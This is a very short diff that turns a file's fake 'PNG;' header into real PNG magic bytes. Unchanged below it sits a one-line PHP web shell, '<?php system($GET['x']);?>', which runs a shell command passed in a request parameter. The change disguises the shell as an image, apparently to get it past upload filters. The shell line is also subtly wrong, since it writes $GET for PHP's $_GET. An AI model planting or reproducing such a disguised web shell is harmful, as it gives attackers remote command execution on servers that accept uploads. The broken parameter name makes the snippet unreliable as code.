@@ -1,2 +1,4 @@
-PNG;
+‰PNG
+
+
 <?php system($GET['x']);?>
